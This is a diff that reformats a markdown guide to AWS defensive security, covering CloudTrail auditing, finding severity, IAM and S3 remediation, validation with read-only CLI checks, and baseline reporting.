-✓ Access Analyzer Enabled
-✓ Regular Policy Reviews
-```
+- ✓ Block Public Access Enabled
+- ✓ No Public Bucket Policies
+- ✓ ACLs Disabled
+- ✓ Encryption Enabled
+- ✓ Versioning Enabled
+- ✓ Logging Enabled
+- ✓ Least Privilege IAM Access
+- ✓ Security Hub Monitoring
+- ✓ Access Analyzer Enabled
+- ✓ Regular Policy Reviews
 
 ## Key Takeaway
 
@@ -21139,22 +21372,17 @@ Simplified event:
     "userName": "alice"
   }
 }
+
 ```
 
 Important fields:
 
 | Field           | Purpose                 |
-
 | --------------- | ----------------------- |
-
 | eventTime       | When action occurred    |
-
 | eventName       | API operation           |
-
 | eventSource     | AWS service             |
-
 | sourceIPAddress | Originating IP          |
-
 | userIdentity    | Actor performing action |
 
 ## Security Investigation Example
@@ -21181,9 +21409,13 @@ This makes incident response possible.
 CloudTrail helps identify:
 
 **Root Account Usage**
-- Root Login
-- ↓
-- Investigation Trigger
+
+```text
+Root Login
+↓
+Investigation Trigger
+```
+
 **Privilege Escalation:** `AttachAdministratorAccess`
 **New Access Keys:** `CreateAccessKey`
 **Policy Changes**
@@ -21214,9 +21446,11 @@ Best practices:
 
 **AWS Security Hub:** Aggregates:
 
-- CloudTrail Findings
-- ↓
-- Security Dashboard
+```text
+CloudTrail Findings
+↓
+Security Dashboard
+```
 
 **Amazon EventBridge:** Automates responses:
 
@@ -21225,15 +21459,23 @@ Best practices:
 ## CloudTrail Best Practices
 
 **Enable Multi-Region Trails**
-- All AWS Regions
-- ↓
-- Single Audit Trail
+
+```text
+All AWS Regions
+↓
+Single Audit Trail
+```
+
 Prevents attackers from hiding activity in unused regions.
 
 **Log to S3**
-- CloudTrail
-- ↓
-- S3 Storage
+
+```text
+CloudTrail
+↓
+S3 Storage
+```
+
 Provides long-term retention.
 
 **Enable Log Validation:** `Log Integrity Validation`
@@ -21363,18 +21605,26 @@ Low-severity findings represent minor risks or opportunities for improvement.
 Severity should consider multiple dimensions:
 
 **1. Exposure**
-- Internet Facing?
-- ↓
-- Higher Priority
+
+```text
+Internet Facing?
+↓
+Higher Priority
+```
+
 Examples:
 - Public EC2
 - Public S3
 - Public RDS
 
 **2. Privilege Level**
-- Administrator Access
-- ↓
-- Higher Risk
+
+```text
+Administrator Access
+↓
+Higher Risk
+```
+
 Examples:
 - Root Account
 - Admin Role
@@ -21435,27 +21685,16 @@ Recommended remediation order:
 ## Common AWS Security Findings by Severity
 
 | Severity | Example Finding                   |
-
 | -------- | --------------------------------- |
-
 | Critical | Root access keys active           |
-
 | Critical | Compromised credentials detected  |
-
 | High     | Public RDS database               |
-
 | High     | SSH open to 0.0.0.0/0             |
-
 | High     | Public S3 bucket                  |
-
 | Medium   | MFA not enforced                  |
-
 | Medium   | CloudTrail not enabled everywhere |
-
 | Medium   | Old access keys                   |
-
 | Low      | Unused IAM roles                  |
-
 | Low      | Missing resource tags             |
 
 ## Security Hub Severity Mapping
@@ -21570,12 +21809,14 @@ before production deployment.
 ## Example: IAM Policy Remediation
 
 **Risky Policy**
+
 ```json
 {
 "Effect":"Allow",
 "Action":"*",
 "Resource":"*"
 }
+
 ```
 Incorrect approach:
 
@@ -21735,8 +21976,10 @@ Good approach:
 
 Examples:
 **IAM:** Instead of:
+
 ```json
 "Action":"*"
+
 ```
 
 Replace with:
@@ -21745,6 +21988,7 @@ Replace with:
 "Action":[
 "s3:GetObject"
 ]
+
 ```
 
 **Security Groups:** Instead of:
@@ -21789,23 +22033,34 @@ Removing a configuration does not automatically mean the security issue is fixed
 Validation methods include:
 
 **Security Hub**
-- Finding Status
-- ↓
-- Resolved
+
+```text
+Finding Status
+↓
+Resolved
+```
+
 **AWS Config**
-- Compliance Check
-- ↓
-- Compliant
+
+```text
+Compliance Check
+↓
+Compliant
+```
+
 **CLI Validation:** Example:
+
 ```bash
 aws s3api get-public-access-block \
 --bucket company-data
+
 ```
 
 or
 
 ```bash
 aws iam get-account-summary
+
 ```
 
 ## Re-Run Security Checks
@@ -21899,13 +22154,21 @@ Document:
 
 **No Baseline Documentation:** `Cannot Roll Back`
 **Large-Scale Changes**
-- Many Systems Modified
-- ↓
-- Unknown Failure Source
+
+```text
+Many Systems Modified
+↓
+Unknown Failure Source
+```
+
 **No Validation**
-- Finding Appears Fixed
-- ↓
-- Risk Still Exists
+
+```text
+Finding Appears Fixed
+↓
+Risk Still Exists
+```
+
 **No Audit Trail**
 - No Record
 - No Accountability
@@ -22114,13 +22377,21 @@ or
 ## Common Monitoring Mistakes
 
 **Monitoring Only During Audits**
-- Annual Audit
-- ↓
-- 11 Months Without Visibility
+
+```text
+Annual Audit
+↓
+11 Months Without Visibility
+```
+
 **No Alerting**
-- Finding Exists
-- ↓
-- Nobody Notified
+
+```text
+Finding Exists
+↓
+Nobody Notified
+```
+
 **Single Account Monitoring**
 - Production Protected
 - Development Forgotten
@@ -22194,15 +22465,10 @@ Security teams often begin with an overall severity summary.
 Example:
 
 | Severity | Count |
-
 | -------- | ----- |
-
 | Critical | 3     |
-
 | High     | 12    |
-
 | Medium   | 28    |
-
 | Low      | 17    |
 
 This provides an immediate view of organizational risk.
@@ -22225,19 +22491,12 @@ Findings should also be grouped by affected resource type.
 Example:
 
 | Resource Type   | Findings |
-
 | --------------- | -------- |
-
 | IAM             | 15       |
-
 | S3              | 10       |
-
 | EC2             | 18       |
-
 | Security Groups | 8        |
-
 | CloudTrail      | 3        |
-
 | Other           | 6        |
 
 This helps prioritize remediation efforts.
@@ -22257,13 +22516,9 @@ Common statuses:
 Example:
 
 | Finding                | Status      |
-
 | ---------------------- | ----------- |
-
 | Root Access Key Active | Resolved    |
-
 | Public S3 Bucket       | In Progress |
-
 | Missing MFA            | Open        |
 
 ## Baseline File Formats
@@ -22297,6 +22552,7 @@ Critical,Root Access Key Active,IAM,Open
 High,SSH Open to Internet,EC2,Open
 Medium,MFA Not Enabled,IAM,In Progress
 Low,Unused IAM Group,IAM,Open
+
 ```
 
 This format can easily be imported into reporting tools.
@@ -22329,30 +22585,20 @@ Typical workflow:
 **Initial Baseline**
 
 | Severity | Count |
-
 | -------- | ----- |
-
 | Critical | 5     |
-
 | High     | 20    |
-
 | Medium   | 35    |
-
 | Low      | 25    |
 Total Findings: 85
 
 **After Remediation**
 
 | Severity | Count |
-
 | -------- | ----- |
-
 | Critical | 0     |
-
 | High     | 6     |
-
 | Medium   | 15    |
-
 | Low      | 18    |
 Total Findings: 39
 
